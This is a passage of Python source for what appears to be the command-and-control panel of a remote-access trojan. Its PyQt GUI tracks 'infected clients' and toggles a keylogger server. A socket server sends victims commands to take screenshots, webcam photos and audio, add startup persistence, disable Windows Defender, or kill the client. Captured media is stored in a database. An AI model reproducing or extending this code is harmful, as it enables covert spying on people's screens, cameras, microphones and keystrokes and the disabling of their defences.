    def addDatabaseImageToPane(self, date_captured):
        # Get the image data
        # Get the rowID of the image
        #
        image = self.database_handle.getBlobData(self.tableDatabaseCombobox.currentText(), 'image',
                                                 date_captured)

        self.imagePreviewLabel.setVisible(True) # Enables the database image preview pane
        pixmap = QPixmap()
        pixmap.loadFromData(image)
        pixmap = pixmap.scaled(641, 360)

        self.imagePreviewLabel.setPixmap(pixmap)

    def insertTableToView(self, columns, values):
        # Insert Column in table
        # Insert Values in table
        self.databaseViewTable.setRowCount(len(values))  # Set the row count based on row values
        self.databaseViewTable.setColumnCount(len(columns)) # Set the column count based on column values
        self.databaseViewTable.setHorizontalHeaderLabels(columns)  # Set the column names

        for row in range(len(values)):
            for column in range(len(values[row])):
                if type(values[row][column]) is int:
                    newValue = QTableWidgetItem(str(values[row][column]))
                elif values[row][column] is None:
                    newValue = QTableWidgetItem('')
                elif len(values[row][column]) > 1000:
                    newValue = QTableWidgetItem('LARGE DATA VALUE')
                else:
                    newValue = QTableWidgetItem(str(values[row][column]))

                self.databaseViewTable.setItem(row, column, newValue)

    def animateBanner(self):
        speed = 10
        x = -325
        y = self.allControlConfigBannerLabel.pos().y()
        self.allControlConfigBannerLabel.move(x, y)

        while True:
            x = self.allControlConfigBannerLabel.pos().x()
            y = self.allControlConfigBannerLabel.pos().y()
            x += speed
            if x >= 525:
                x = -325
            self.allControlConfigBannerLabel.move(x, y)
            time.sleep(.0166)

    def updateClientConfig(self):
        # Should check each field in information to ensure its not empty. This will dictate if client is selected
        # If any field is empty return (ignore button click)

        if self.clientIdTextbox.toPlainText() == '':
            return
        if self.sIdTextBox.toPlainText() == '':
            return
        if self.clientIpTextbox.toPlainText() == '':
            return
        if self.windowUsernameTextbox.toPlainText() == '':
            return
        if self.macaddressTextbox.toPlainText() == '':
            return
        if self.networkUsernameTextbox.toPlainText() == '':
            return
        if self.timeTextbox.toPlainText() == '':
            return

        # Prompt user to confirm

        # Update the config on the server database
        config = self.getConfigValueFromGui()

        client_id = int(self.clientIdTextbox.toPlainText())

        # Get current config
        # If Different proceed, if not return
        current_config = self.database_handle.get_config_file(client_id)
        current_config = list(current_config[1:])

        if current_config == config:
            return

        self.database_handle.modifyClientConfig(client_id, config)
        # Send updated config to client
        if self.command_server_handle.command_server_connected:
            # Must ensure command server is connected
            # Look through connected clients to find if client is connected.
            for client in self.command_server_handle.client_handles:
                # If they are, send them the new config through the command server
                if client.client_id == client_id:
                    self.command_server_handle.send_updated_config(client)

        # If they are not continue and when client connects next time through handshake they will get update

        # Check if client is favorite and if so highlight row in table
        if config[-1]: # If favorite is enabled
            for row in range(self.infectedClientsConfigViewTable.rowCount()):
                tableClientId = self.infectedClientsConfigViewTable.item(row,
                                                                         0)  # Get the cell in column 0 (Client ID column)
                if tableClientId is not None and int(tableClientId.text()) == client_id:
                    for column in range(self.infectedClientsConfigViewTable.columnCount()):
                        self.infectedClientsConfigViewTable.item(row, column).setForeground(
                            QtGui.QColor("green"))  ##FF0000;
        else:
            for row in range(self.infectedClientsConfigViewTable.rowCount()):
                tableClientId = self.infectedClientsConfigViewTable.item(row,
                                                                         0)  # Get the cell in column 0 (Client ID column)

                if tableClientId is not None and int(tableClientId.text()) == client_id:
                    for column in range(self.infectedClientsConfigViewTable.columnCount()):
                        self.infectedClientsConfigViewTable.item(row, column).setForeground(
                            QtGui.QColor("white"))  ##FF0000;

    def undoClientConfigChanges(self):
        # Get client ID from GUI
        # Get current config from DB
        # Get updated config values from GUI
        # If they're different, set the GUI config to that of the one in the DB
        client_id = self.clientIdTextbox.toPlainText()
        if client_id == '':
            return
        savedConfig = list(self.database_handle.get_config_file(client_id)[1:])
        config = self.getConfigValueFromGui()
        if savedConfig != config:
            if savedConfig[0] == 1:
                self.clientKeyloggerEnabledCheckbox.setChecked(True)
            else:
                self.clientKeyloggerEnabledCheckbox.setChecked(False)

            if savedConfig[1] == 1:
                self.dataServerEnabledCheckbox.setChecked(True)
            else:
                self.dataServerEnabledCheckbox.setChecked(False)

            if savedConfig[2] == 1:
                self.favoriteCheckbox.setChecked(True)
            else:
                self.favoriteCheckbox.setChecked(False)

    def getConfigValueFromGui(self):
        config = []
        if self.clientKeyloggerEnabledCheckbox.isChecked():
            config.append(1)
        else:
            config.append(0)

        if self.dataServerEnabledCheckbox.isChecked():
            config.append(1)
        else:
            config.append(0)

        if self.favoriteCheckbox.isChecked():
            config.append(1)
        else:
            config.append(0)
        return config

    def displayFavorites(self):
        # Get all the client_id's that are favorites
        # Go through each config row and read the favorite field.
        # If favorite, capture client_id into list

        # Get configs
        favorite_clientIds = []
        configs = self.database_handle.get_client_configs() # Returns all client configs
        for client_config in configs:
            if client_config[3]: # If favorite
                favorite_clientIds.append(client_config[0]) # Append client_id

        # Go through table and find all rows from favorite clients
        # Add green foreground to favorites

        # Iterate through the rows and compare client_id
        for row in range(self.infectedClientsConfigViewTable.rowCount()):
            tableClientId = self.infectedClientsConfigViewTable.item(row, 0) # Get the cell in column 0 (Client ID column)
            if tableClientId is not None and int(tableClientId.text()) in favorite_clientIds:
                for column in range(self.infectedClientsConfigViewTable.columnCount()):
                    self.infectedClientsConfigViewTable.item(row, column).setForeground(QtGui.QColor("green"))  ##FF0000;
                favorite_clientIds.remove(int(tableClientId.text())) # Remove from list after to make search smaller
            else: # Else draw it back to non-favorite color
                for column in range(self.infectedClientsConfigViewTable.columnCount()):
                    self.infectedClientsConfigViewTable.item(row, column).setForeground(QtGui.QColor("white"))  ##FF0000;

    def clientConfigSelected(self):
        selectedClientConfig = self.infectedClientsConfigViewTable.selectedItems()

        if selectedClientConfig == []:
            return

        configClientInfo = []
        count = 0

        # Gets display attributes from client info
        for cell in selectedClientConfig:
            if count == 0 or count == 1 or count == 2 or count == 3 or count == 5 or count == 9 or count == 16:  # If its client ID column
                configClientInfo.append(cell.text()) # Add it to configInfo for table
            count += 1

        # Converts time zone to time for visibility
        time = configClientInfo[-1]
        time = getLocalTime(time)
        configClientInfo[-1] = time

        clientConfig = list(self.database_handle.get_config_file(configClientInfo[0])) # Get config from client ID
        clientConfig = clientConfig[1:] # Remove client ID, we dont need it
        self.populateConfigDisplayInfo(configClientInfo, clientConfig)

    def populateConfigDisplayInfo(self, configClientDisplayInfo, clientConfig):
        # Takes list and populates info

        if self.clientIdTextbox.toPlainText() == '':
            self.clientIdTextbox.insertPlainText(configClientDisplayInfo[0])
        else:
            self.clientIdTextbox.setPlainText(configClientDisplayInfo[0])
        if self.sIdTextBox.toPlainText() == '':
            self.sIdTextBox.insertPlainText(configClientDisplayInfo[1])
        else:
            self.sIdTextBox.setPlainText(configClientDisplayInfo[1])

        if self.macaddressTextbox.toPlainText() == '':
            self.macaddressTextbox.insertPlainText(configClientDisplayInfo[2])
        else:
            self.clientIpTextbox.setPlainText(configClientDisplayInfo[2])

        if self.clientIpTextbox.toPlainText() == '':
            self.clientIpTextbox.insertPlainText(configClientDisplayInfo[3])
        else:
            self.clientIpTextbox.setPlainText(configClientDisplayInfo[3])

        if self.windowUsernameTextbox.toPlainText() == '':
            self.windowUsernameTextbox.insertPlainText(configClientDisplayInfo[4])
        else:
            self.windowUsernameTextbox.setPlainText(configClientDisplayInfo[4])

        if self.networkUsernameTextbox.toPlainText() == '':
            self.networkUsernameTextbox.insertPlainText(configClientDisplayInfo[5])
        else:
            self.networkUsernameTextbox.setPlainText(configClientDisplayInfo[5])

        if self.timeTextbox.toPlainText() == '':
            self.timeTextbox.insertPlainText(configClientDisplayInfo[6])
        else:
            self.timeTextbox.setPlainText(configClientDisplayInfo[6])

        if clientConfig[0] == 1:
            self.clientKeyloggerEnabledCheckbox.setChecked(True)
        else:
            self.clientKeyloggerEnabledCheckbox.setChecked(False)

        if clientConfig[1] == 1:
            self.dataServerEnabledCheckbox.setChecked(True)
        else:
            self.dataServerEnabledCheckbox.setChecked(False)

        if clientConfig[2] == 1:
            self.favoriteCheckbox.setChecked(True)
        else:
            self.favoriteCheckbox.setChecked(False)

    def toggleCommandServer(self):
        # Will read the server status from database not checkbox because monitorServerConfigs()
        # will be drawing to that widget depending on if the command_server_enabled flag is True

        # Should read database value 0 = Offline, 1 = Online and do the opposite. That is if its 0, change to 1
        # Should also display a prompt when toggling on and off.

        current_value = self.databaseHandle.get_server_config()
        while current_value is None:  # Waits for config to get created if it doesn't exist.
            time.sleep(IDLE_TIME)
            current_value = self.databaseHandle.get_server_config()

        commandServerEnabled = current_value[0] # Command server value is first in the list.

        if commandServerEnabled:
            # Calls the opposite of the current value since its a toggle.
            self.disableCommandServer()

        elif not commandServerEnabled:
            self.enableCommandServer()

    def enableCommandServer(self):
        self.databaseHandle.updateCommandServerConfig(True)
        self.command_server_handle.command_server_enabled = True

    def disableCommandServer(self):
        self.databaseHandle.updateCommandServerConfig(False)
        self.command_server_handle.command_server_enabled = False  # If socket was open and now command server is disabled,
        # it must be closed.
        if self.command_server_handle.command_socket:
            self.command_server_handle.command_socket.close()
            self.command_server_handle.command_socket = None
        if self.command_server_handle.ping_socket:
            self.command_server_handle.ping_socket.close()
            self.command_server_handle.ping_socket = None

    def toggleKeyloggerServer(self):
        # Will read the server status from database not checkbox because monitorServerConfigs()
        # will be drawing to that widget depending on if the keylogger_server_enabled flag is True

        # Should read database value False = Offline, True = Online and do the opposite.
        # That is if its True, change to False since its a toggle
        # Should also display a prompt when toggling on and off.

        current_value = self.databaseHandle.get_server_config()
        while current_value is None:  # Waits for config to get created if it doesn't exist.
            time.sleep(IDLE_TIME)
            current_value = self.databaseHandle.get_server_config()

        keyloggerServerEnabled = current_value[1] # Keylogger server value is second in the list.

        if keyloggerServerEnabled:
            # Calls the opposite of the current value since its a toggle.
            self.disableKeyloggerServer()

        elif not keyloggerServerEnabled:
            self.enableKeyloggerServer()

    def enableKeyloggerServer(self):
        self.databaseHandle.updateKeyloggerServerConfig(True)
        self.keylogger_server_handle.keylogger_server_enabled = True

    def disableKeyloggerServer(self):
        self.databaseHandle.updateKeyloggerServerConfig(False)
        self.keylogger_server_handle.keylogger_server_enabled = False

        if self.keylogger_server_handle.keylogger_socket is not None:
            self.keylogger_server_handle.keylogger_socket.close()
            self.keylogger_server_handle.keylogger_socket = None
        if self.keylogger_server_handle.ping_socket is not None:
            self.keylogger_server_handle.ping_socket.close()
            self.keylogger_server_handle.ping_socket = None

    def monitorServerConfigs(self):
        while True:
            if self.command_server_handle.command_server_enabled:
                self.commandServerCheckBox.setChecked(True)
            else:
                self.commandServerCheckBox.setChecked(False)

            if self.keylogger_server_handle is None\
                or not self.keylogger_server_handle.keylogger_server_enabled:
                self.keyloggerServerCheckBox.setChecked(False)

            elif self.keylogger_server_handle.keylogger_server_enabled:
                self.keyloggerServerCheckBox.setChecked(True)

            time.sleep(IDLE_TIME)

    def sendToAllCheckBoxMethod(self):
        # Disables target combobox
        if self.sendToAllCheckBox.isChecked():
            self.targetClientIDComboBox.setDisabled(True)
        else:
            self.targetClientIDComboBox.setCurrentText('')
            self.targetClientIDComboBox.setEnabled(True)

    def show_dashboard_logs(self):
        while True:
            #  logs = [[date, source, message],]
            if logs != None:
                for log in logs:
                    row_count = self.logsTable.rowCount()
                    self.logsTable.insertRow(row_count)
                    self.logsTable.setItem(row_count, 0, QTableWidgetItem(log[0]))
                    self.logsTable.setItem(row_count, 1, QTableWidgetItem(log[1]))
                    self.logsTable.setItem(row_count, 2, QTableWidgetItem(log[2]))
                    logs.remove(log)

            time.sleep(IDLE_TIME)

    def monitor_info(self):
        while True:
            # Checks if command server is listening
            if self.command_server_handle.command_server_connected:
                self.infoTable.setItem(0, 0, QTableWidgetItem('Online'))
                self.infoTable.setItem(0, 2, QTableWidgetItem(f'{self.command_server_handle.server_ip}, '
                                                              f'{self.command_server_handle.server_port}'))
                self.infoTable.item(0, 0).setForeground(QtGui.QColor("green")) ##FF0000;

            else:
                self.infoTable.setItem(0, 0, QTableWidgetItem('Offline'))
                self.infoTable.setItem(0, 2, QTableWidgetItem('NA'))
                self.infoTable.item(0, 0).setForeground(QtGui.QColor(self.red_color))


            if self.keylogger_server_handle is None \
                    or not self.keylogger_server_handle.keylogger_server_connected:
                self.infoTable.setItem(0, 1, QTableWidgetItem('Offline'))
                self.infoTable.setItem(0, 3, QTableWidgetItem('NA'))
                self.infoTable.item(1, 0).setForeground(QtGui.QColor(self.red_color))


            elif self.keylogger_server_handle.keylogger_server_connected:
                self.infoTable.setItem(0, 1, QTableWidgetItem('Online'))
                self.infoTable.setItem(0, 3, QTableWidgetItem(f'{self.keylogger_server_handle.keylogger_ip}, '
                                                              f'{self.keylogger_server_handle.keylogger_port}'))
                self.infoTable.item(1, 0).setForeground(QtGui.QColor("green"))

            time.sleep(IDLE_TIME)

    def monitor_command_connections(self):
        client_handles_count = self.connectedClientsCommandServer.rowCount()

        while True:
            clients_connected = len(self.command_server_handle.client_handles)
            if clients_connected != client_handles_count:
                self.targetClientIDComboBox.clear()
                self.connectedClientsCommandServer.setRowCount(0)
                self.connectedClients.setRowCount(0)
                row_count = 0
                for client in self.command_server_handle.client_handles:
                    if client.name is None:
                        break
                    else:
                        self.connectedClientsCommandServer.insertRow(row_count)
                        self.connectedClients.insertRow(row_count)
                        self.targetClientIDComboBox.addItem(str(client.client_id))

                        # Use client ID to pull client info and populate connected clients in commands tab
                        # When applying a filter, if a new record is added it should be appended to filtered table if it meets condition

                        client_info = self.database_handle.get_client_info_wID(client.client_id)
                        self.connectedClients.setColumnCount(len(client_info))

                        column_count = 0
                        for item in client_info:
                            self.connectedClients.setItem(row_count, column_count, QTableWidgetItem(str(item)))
                            column_count += 1

                        self.connectedClientsCommandServer.setItem(row_count, 0, QTableWidgetItem(str(client.client_id)))
                        self.connectedClientsCommandServer.setItem(row_count, 1, QTableWidgetItem(
                            f'{client.client_address[0]}:{client.client_address[1]}'))
                        self.connectedClientsCommandServer.setItem(row_count, 2, QTableWidgetItem(client.name))
                        row_count += 1

                client_handles_count = row_count

                #  search which client id is not in the list
            time.sleep(IDLE_TIME)

    def monitor_keylogger_connections(self):
        client_handles_count = 0
        while True:
            if self.keylogger_server_handle.keylogger_socket is None or not self.keylogger_server_handle.keylogger_server_enabled:
                self.connectedClientsKeyloggerServer.clear()
                self.connectedClients.setRowCount(0)
                client_handles_count = 0
            else:
                clients_connected = len(self.keylogger_server_handle.keylogger_handles)
                if clients_connected != client_handles_count:
                    self.connectedClientsKeyloggerServer.setRowCount(0)
                    row_count = 0
                    for client in self.keylogger_server_handle.keylogger_handles:
                        if client.client_id is None:
                            break
                        else:
                            self.connectedClientsKeyloggerServer.insertRow(row_count)

                            self.connectedClientsKeyloggerServer.setItem(row_count, 0,
                                                                       QTableWidgetItem(str(client.client_id)))
                            self.connectedClientsKeyloggerServer.setItem(row_count, 1, QTableWidgetItem(
                                f'{client.client_address[0]}:{client.client_address[1]}'))
                            self.connectedClientsKeyloggerServer.setItem(row_count, 2, QTableWidgetItem(client.sID))
                            row_count += 1
                    client_handles_count = row_count

                #  search which client id is not in the list
            time.sleep(IDLE_TIME)

    def load_infected_clients(self):
        client_table = self.database_handle.get_client_info()
        infected_clients_count = len(client_table)
        for row in range(len(client_table)):
            self.infectedClients.insertRow(row)
            self.infectedClientsConfigViewTable.insertRow(row)
            for column in range(len(client_table[0])):
                self.infectedClients.setItem(row, column, QTableWidgetItem(str(client_table[row][column])))
                self.infectedClientsConfigViewTable.setItem(row, column, QTableWidgetItem(str(client_table[row][column])))

        self.displayFavorites()

        while True:
            client_table = self.database_handle.get_client_info()
            if infected_clients_count != len(client_table):
                self.infectedClients.setRowCount(0)
                self.infectedClientsConfigViewTable.setRowCount(0)

                for row in range(len(client_table)):
                    self.infectedClients.insertRow(row)
                    self.infectedClientsConfigViewTable.insertRow(row)
                    for column in range(len(client_table[0])):
                        self.infectedClients.setItem(row, column, QTableWidgetItem(str(client_table[row][column])))
                        self.infectedClientsConfigViewTable.setItem(row, column, QTableWidgetItem(str(client_table[row][column])))
                infected_clients_count = len(self.database_handle.get_client_info())
            time.sleep(IDLE_TIME) # Change to 5 seconds

    def load_commands(self):

        commands = self.database_handle.get_command_info()

        for command in commands:
            self.commandNameComboBox.addItem(command[0])

        previous_command = ''
        while True:
            current_command = self.commandNameComboBox.currentText()
            if current_command != '' and current_command != previous_command:
                for command in commands:
                    if command[0] == current_command:
                        print(f'command[1] = {command[1]}')
                       # if self.commandDescriptionBrowser.toPlainText() == '':
                       #     self.commandDescriptionBrowser.insertPlainText(command[1])
                       # else:
                       #     self.commandDescriptionBrowser.setPlainText(command[1])
                      #  if self.noiseLevel.toPlainText() == '':
                      #      self.noiseLevel.insertPlainText(str(command[2]))
                     #   else:
                      #      self.noiseLevel.setPlainText(str(command[2]))
                        previous_command = current_command
                        break

            time.sleep(IDLE_TIME)

    def commandFullScreenButtonClicked(self):
        if len(self.imageCaptureData) == 0:
            return

        self.fullscreenWindowHandle = gui.fullScreenImageWindow()
        # Get from the self.imagePreviewLabel

        pixmap = QPixmap()
        pixmap.loadFromData(self.imageCaptureData[self.imageCaptureViewIndex])
        pixmap = pixmap.scaled(self.fullscreenWindowHandle.window_width, self.fullscreenWindowHandle.window_height)
        self.fullscreenWindowHandle.fullscreenImageLabel.setPixmap(pixmap)
        self.fullscreenWindowHandle.new_window.show()

    def sendCommand(self):
       # try:
            command = self.commandNameComboBox.currentText()
            client_id = self.targetClientIDComboBox.currentText()
            target = None

            if command == '' or client_id == '':
                # Show error prompt asking for command and client id selection
                return

            for client in self.command_server_handle.client_handles:
                if client.client_id == int(client_id):
                    target = client
                    break

            if target is None:
                return
            elif command == 'SCREENSHOT':
                parameters = self.getScreenshotParameters() # Should get quantity and time interval and return as a list. (Quantity, Time)
                return_status = self.command_server_handle.get_screenshot(target, parameters)
                # If captured screenshot is valid then proceed
                if return_status == 200:
                    # Get the most recent screenshot from the screenshots DB
                    screenshot_data = self.database_handle.getMostRecentImage('SCREENSHOT')
                    # Add to screenshot capture list
                    self.imageCaptureData.append(screenshot_data)
                    # The image label will display the selected image
                    self.imageCaptureViewIndex = len(self.imageCaptureData) - 1 # Gets the last index of the image list since that list will have the most recent capture at the end
                    self.addCommandPreviewImage()
                    # If they click next, it will go to the next index of the screenshot capture list
                    # If it exceeds maxSize() wrap around to the beginning of the list
                    # It should be able to hold both webcam pics and screenshots
                    # Eventually audio as well

            elif command == 'STARTUP':
                #choice = input('THIS COMMAND WILL TRIGGER ANTI VIRUS SOFTWARE. ARE YOU SURE YOU WANT TO SEND? [Y/N]?').upper()
                #if choice == 'Y':
                return_status = self.command_server_handle.set_startup(target)
            elif command == 'WEBCAM':
                return_status = self.command_server_handle.get_webcam(target, [self.commandParametersForm['Photo Quantity'].value(), self.commandParametersForm['Webcam Time Interval'].value()])  # 404 or 200
                # Get the most recent screenshot from the screenshots DB
                webcam_data = self.database_handle.getMostRecentImage('WEBCAM')
                # Add to screenshot capture list
                self.imageCaptureData.append(webcam_data)
                # The image label will display the selected image
                self.imageCaptureViewIndex = len(
                    self.imageCaptureData) - 1  # Gets the last index of the image list since that list will have the most recent capture at the end
                self.addCommandPreviewImage()
                # If they click next, it will go to the next index of the screenshot capture list
                # If it exceeds maxSize() wrap around to the beginning of the list
                # It should be able to hold both webcam pics and screenshots
                # Eventually audio as well

            elif command == 'AUDIO':
                return_status = self.command_server_handle.get_audio(target, [self.commandParametersForm['Audio Duration'].value()],)
            elif command == 'KILL':
                return_status = self.command_server_handle.kill_client(target)
            elif command == 'DEFENDER':
                return_status = self.command_server_handle.disable_defender(target)
            elif command == 'UPDATE':  # Sends the updated client config to connected clients
                return_status = self.command_server_handle.send_updated_config(target)  # Client num is a special object in this branch. It is the client object
                return return_status
            self.database_handle.log_command(target.client_id, command, return_status)
            self.populateDatabaseViewTable()
      #  except Exception as Error:
      #      return_status = 404
      #      print(f'ERROR : {Error}')
            return return_status

    def getScreenshotParameters(self):
        params = []
        for key in self.commandParameterValuesDict:
            params.append(self.commandParameterValuesDict[key])


        print(f'params = {params}')
        return params

    def addCommandPreviewImage(self):

        image_label = QLabel()
        pixmap = QPixmap()
        pixmap.loadFromData(self.imageCaptureData[self.imageCaptureViewIndex])
        pixmap = pixmap.scaled(641, 360)

        image_label.setPixmap(pixmap)

        self.commandMediaImageLabel.setPixmap(pixmap)



IDLE_TIME = 1
HEADER = 1024
GOOD = 200


def serialize_data(data):
    data = pickle.dumps(data)
    return data


def deserialize_data(data):
    data = pickle.loads(data)
    return data


def get_time_stamp(**kwargs):
    if 'file_safe' in kwargs and kwargs['file_safe']:
        time_stamp = datetime.datetime.utcnow().isoformat(sep=" ", timespec='milliseconds')
        time_stamp = time_stamp.replace(':', '=')
        time_stamp = time_stamp.replace('.', '_')
    else:
        time_stamp = datetime.datetime.utcnow().isoformat(sep=" ", timespec='milliseconds')

    return time_stamp

def getLocalTime(time_string):
    time_string = time_string.split(') ', 1)[1]
    time_string = time_string.split(' (')[0]
    # Extract the time zone information from the input string

    # Create a datetime object for the current time in the specified time zone
    try:
        if time_string == 'Pacific Time':
            time_string = 'America/Los_Angeles'
        elif time_string == 'Eastern Time':
            time_string = 'America/New_York'
        elif time_string == 'Greenwich Mean Time':
            time_string = 'Europe/London'
        elif time_string == 'Central European Time':
            time_string = 'Europe/Paris'
        elif time_string == 'Japan Standard Time':
            time_string = 'Asia/Tokyo'

        tz = pytz.timezone(time_string)
        local_time = datetime.datetime.now(tz)

    except pytz.exceptions.UnknownTimeZoneError:
        return "Unknown time zone"

    # Format the local time as HH:MM AM/PM
    formatted_time = local_time.strftime('%I:%M%p')
    return formatted_time

def extract_zip_to_filenames(zip_filename):
    """
    Extract files from a zip archive and return a list of original file names.

    Args:
        zip_filename (str): The name of the input zip file.
        extract_path (str): The path where the files will be extracted.

    Returns:
        list: List of original file names.
    """
    extract_path = "."
    file_names = []

    with zipfile.ZipFile(zip_filename, 'r') as zipf:
        for file_info in zipf.infolist():
            zipf.extract(file_info, path=extract_path)
            file_names.append(file_info.filename)

    return file_names


def qtable_to_2d_array(qtable):
    rows = qtable.rowCount()
    columns = qtable.columnCount()

    data_2d = []
    for row in range(rows):
        row_data = []
        for col in range(columns):
            item = qtable.item(row, col)
            if item is not None:
                row_data.append(item.text())
            else:
                row_data.append(None)
        data_2d.append(row_data)

    return data_2d

def remove_characters_at_index(input_string, index_to_remove, quantity):
    # Check if the starting index is valid
    if 0 <= index_to_remove < len(input_string):
        # Calculate the starting index for removal
        start_index = max(0, index_to_remove - quantity + 1)
        # Calculate the ending index for removal
        end_index = index_to_remove + 1

        # Create a new string by excluding the characters in the specified range
        new_string = input_string[:start_index] + input_string[end_index:]
        return new_string
    else:
        # Handle the case where the index is out of range
        return input_string

def remove_first_occurrence(input_string, substring):
    # Use str.replace() with a maximum of 1 replacement
    new_string = input_string.replace(substring, "", 1)
    return new_string


class CommandServer:

    database_handle = None
    command_server_enabled = None
    command_socket = None
    ping_socket = None
    ping_service_connected = None
    ping_connections = list(list())  # Will hold lists with client address and connection

    command_server_connected = None
    ping_port = 11277
    server_ip, server_port = '192.168.1.21', 17119
    client_handles = list()
    client_connections = list()
    commands = list()#('SCREENSHOT', 'STARTUP', 'WEBCAM', 'KILL', 'AUDIO')

    certificate = None
    private_key = None
    country = None
    state = None
    common_name = None
    removingClients = False

    def __init__(self):
        return

    def start_command_server_listener(self):
        while True:
            if self.command_server_enabled:
                self.listen()
            time.sleep(IDLE_TIME)

    def listen(self):
        #  Creates socket
        while True:
            while self.command_server_enabled:  # Start command server if enabled, start listening
                try:
                    if self.command_socket is None:
                        self.command_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                        #  Updated steps
                        self.command_socket.bind((self.server_ip, self.server_port))
                        self.command_socket.listen(5)
                        print(f"[{get_time_stamp()}] [COMMAND SERVER] LISTENING AT {self.server_ip}:{self.server_port}")
                        logs.append(
                            [get_time_stamp(), 'COMMAND SERVER', f'LISTENING AT {self.server_ip}:{self.server_port}'])
                        self.command_server_connected = True

                    client, client_address = self.command_socket.accept()
                    print(f'[{get_time_stamp()}] [COMMAND SERVER] RECEIVED CONNECTION FROM CLIENT#: {client_address}')
                    logs.append([get_time_stamp(), 'COMMAND SERVER', f'RECEIVED A CONNECTION FROM {self.server_ip}:{self.server_port}'])

                    client_handle = Client()
                    self.client_handles.append(client_handle)
                    self.client_connections.append(client)
                    command_client_thread = threading.Thread(target=client_handle.connect, args=(client, client_address))
                    command_client_thread.start()

                except (OSError, AttributeError) as Error:
                    print(f'[{get_time_stamp()}] COMMAND SERVER WAS CLOSED: {Error}')
                    logs.append([get_time_stamp(), 'COMMAND SERVER', f'SERVER WAS CLOSED: {Error}'])
                    time.sleep(IDLE_TIME)
                    self.close_command_server()

            time.sleep(IDLE_TIME)

    def listen_command_server_ping_service(self):
        while True:
            while self.command_server_enabled:
                try:
                    if self.ping_socket is None:
                        self.ping_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        self.ping_socket.bind((self.server_ip, self.ping_port))
                        self.ping_socket.listen(5)
                        print(
                            f"[{get_time_stamp()}] [COMMAND PING SERVER] LISTENING AT {self.server_ip}:{self.ping_port}")
                        logs.append([get_time_stamp(), 'COMMAND PING SERVER',
                                     f'LISTENING AT {self.server_ip}:{self.ping_port}'])

                        self.ping_service_connected = True

                    ping_connection, ping_address = self.ping_socket.accept()
                    print(f"[{get_time_stamp()}] [COMMAND PING SERVER] RECEIVED A CONNECTION FROM {ping_address[0]}:{ping_address[1]}")
                    logs.append([get_time_stamp(), 'COMMAND PING SERVER', f'RECEIVED A CONNECTION FROM {ping_address[0]}:{ping_address[1]}'])
                    self.ping_connections.append((ping_address, ping_connection))

                except (AttributeError, OSError) as Error:
                    print(f'[{get_time_stamp()}] [COMMAND PING SERVER] SERVER WAS CLOSED: {Error}')
                    logs.append([get_time_stamp(), 'COMMAND PING SERVER', f'SERVER WAS CLOSED: {Error}'])
                    self.close_command_server()


                time.sleep(IDLE_TIME)

            time.sleep(IDLE_TIME)

    def check_command_server_clients_online(self):
        # ping_client[0][0] = IP Address of client
        while True:
            for ping_client in self.ping_connections:  # Will go through list of clients to ping
                try:
                    ping_client[1].send(b'Ping')  # Sends a byte to test response. Can also make it so that whena a specific code is sent here the client disconnects
                    ping_client[1].recv(4)  # Receives response
                except (ConnectionError, ConnectionResetError) as Error:  # If a client did not receive or send response they are not connected.
                    print('client did not respond to ping')
                    if not self.removingClients:  # Will be true when the server is closed and all teh client connections are being closed
                        for client in self.client_handles:  # Looks for client in client handles to disconnect from command server
                            if client.client_address[0] == ping_client[0][0]:
                                # If client address is equal to the address of
                                # the disconnected ping then remove it from list.
                                self.database_handle.log_client_connection_wID(client.client_id, client.client_address, 'COMMAND', 0)  # Logs the disconnection in the server
                                self.client_handles.remove(client)
                                self.ping_connections.remove(ping_client)
                                client.client_connection.close()
                                print(f'[{get_time_stamp()}] [COMMAND SERVICE] DISCONNECTED FROM CLIENT {client.client_address} : {Error}')
                                logs.append([get_time_stamp(), 'COMMAND PING SERVER', f'DISCONNECTED FROM CLIENT {ping_client[0][0]} : {Error}'])

            time.sleep(IDLE_TIME * 5)

    def close_command_server(self):
        # Sets flag to true so other checks dont log the client disconnection.
        # Makes  database insert to log all the clients disconnected
        # Sets flag to false so normal operations proceed
        if not self.removingClients:
            self.removingClients = True
            if self.ping_socket is not None:
                self.ping_socket.close()
            if self.command_socket is not None:
                self.command_socket.close()
            self.database_handle.log_clients_offline(self.client_handles, 'COMMAND')
            for client in self.client_connections:
                client.close()
            for client in self.ping_connections:
                client[1].close() # Connection is stored as second element in ping_connections tuple

            self.client_handles = []
            self.client_connections = []
            self.ping_connections = []
            # This is in case the client disconnects
            self.ping_service_connected = False
            self.command_server_connected = False
            self.removingClients = False

    def read_command_server_config(self):
        while True:
            server_config = self.database_handle.get_server_config()
            if server_config[0] == 1:
                self.command_server_enabled = True
            else:
                self.command_server_enabled = False  # If socket was open and now command server is disabled,
                # it must be closed.
                if self.command_socket is not None:
                    self.command_socket.close()
                    self.command_socket = None

            time.sleep(IDLE_TIME)

    def get_screenshot(self, client, parameters):
        print(f'screenshot parameters = {parameters}')
        screenshot_quantity = parameters[0]
        time_interval = parameters[1]
        client.send_data(['SCREENSHOT', screenshot_quantity, time_interval])
        time_stamp = get_time_stamp(file_safe=True)
        return_code = client.receive_file('received_screenshots.zip')
        if return_code == '404':
            os.remove('received_screenshots.zip')
            print(f'[{time_stamp}] [COMMAND SERVER] ERROR OCCURRED ON CLIENT SIDE  WHILE TAKING SCREENSHOT FOR CLIENT : '
                  f'[{[{client.client_address}]}]')
            logs.append([{get_time_stamp()}, 'COMMAND SERVER', f'ERROR OCCURRED ON CLIENT SIDE  WHILE TAKING SCREENSHOT FOR CLIENT : [{[{client.client_address}]}][{[{client.client_address}]}]'])
            return 404
        unzipped_screenshots = extract_zip_to_filenames('received_screenshots.zip')
        self.database_handle.upload_screenshots(client.client_id, unzipped_screenshots)
        os.remove('received_screenshots.zip')
        print(f'[{get_time_stamp()}] [COMMAND SERVER] SCREENSHOTS RECEIVED FROM [{client.client_address}]')
        logs.append([get_time_stamp(), 'COMMAND SERVER',
                    f'SCREENSHOTS RECEIVED FROM [{client.client_address}]'])

        return 200

    def get_webcam(self, client, parameters):
        photo_quantity = parameters[0]
        time_interval = parameters[1]

        client.send_data(['WEBCAM', photo_quantity, time_interval])
        return_code = client.receive_file('received_webcam_pics.zip')
        if return_code == '404':  # If webcam capture was not successful it returns 404
            os.remove('received_webcam_pics.zip')
            print(f'[{get_time_stamp()}] [COMMAND SERVER] ERROR OCCURRED ON CLIENT SIDE  WHILE TAKING WEBCAM IMAGE FOR CLIENT: '
                  f'[{[{client.client_address}]}]')
